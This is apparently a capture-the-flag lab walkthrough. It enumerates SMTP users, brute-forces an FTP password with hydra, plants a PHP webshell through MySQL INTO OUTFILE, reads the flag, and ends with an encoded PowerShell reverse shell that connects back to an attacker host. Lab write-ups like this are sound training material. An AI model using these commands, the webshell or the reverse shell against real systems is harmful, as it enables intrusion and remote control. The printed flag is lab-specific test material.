Did an nmap scan 

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-05 08:43 UTC
Nmap scan report for 10.129.122.57
Host is up (0.017s latency).
Not shown: 65528 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
25/tcp   open  smtp
80/tcp   open  http
443/tcp  open  https
587/tcp  open  submission
3306/tcp open  mysql
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 172.85 seconds
```

Enumerated usernames of the SMTP server

```
./smtp-user-enum.pl -M RCPT -U ../my-htb-scripts/users.list -D inlanefreight.htb -t 10.129.122.57


Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... ../my-htb-scripts/users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Sun Oct  5 08:53:23 2025 #########
10.129.122.57: fiona@inlanefreight.htb exists
######## Scan completed at Sun Oct  5 08:53:26 2025 #########
1 results.

79 queries in 3 seconds (26.3 queries / sec)
```

Found `fiona@inlanefreight.htb`

Now let's try brute forcing the password:
```
hydra -l fiona -P rockyou.txt ftp://10.129.122.57

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-05 09:30:53
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking ftp://10.129.122.57:21/
 [21][ftp] host: 10.129.122.57   login: fiona   password: 987654321
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-05 09:31:47
```
Found password `987654321` for account `fiona`

We can login to the ftp server by:
```
ftp fiona@10.129.122.57 
Then provide password: 987654321
```

We can also login to mysql using the following command:
```
mysql -u fiona -p987654321 -h 10.129.122.57
```

Then uploaded a webshell (the location was found by browsing the https server with the credentials found above)

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
 ```

Then searched for a flag file using command
```

http://10.129.122.57/webshell.php?c=powershell%20-c%20Get-ChildItem%20-Path%20C:\%20-Filter%20%22flag*%22%20-Recurse%20-ErrorAction%20SilentlyContinue
```

The output indicated there is a flag.txt file on the desktop of the Administrator

```
Directory: C:\Program Files\Microsoft SQL Server\MSSQL15.SQLEXPRESS\MSSQL\DATA Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 10/5/2025 4:53 AM 8388608 flagDB.mdf -a---- 10/5/2025 4:53 AM 8388608 flagDB_log.ldf Directory: C:\Users\Administrator\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 4/22/2022 10:36 AM 39 flag.txt Directory: C:\xampp\htdocs\dashboard\images Mode LastWriteTime Length Name ---- ------------- ------ ---- d----- 4/22/2022 9:17 AM flags 
```

We can get the content of the file by

```
http://10.129.122.57/webshell.php?c=powershell%20-c%20Get-Content%20C:/Users/Administrator/Desktop/flag.txt
```
Returning `HTB{t#3r3_4r3_tw0_w4y$_t0_93t_t#3_fl49}`

Another way is to run following command to get a reverse shell(see reverse shell generator - https://www.revshells.com/)

```
http://10.129.122.57/webshell.php?c=powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMwAyACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
```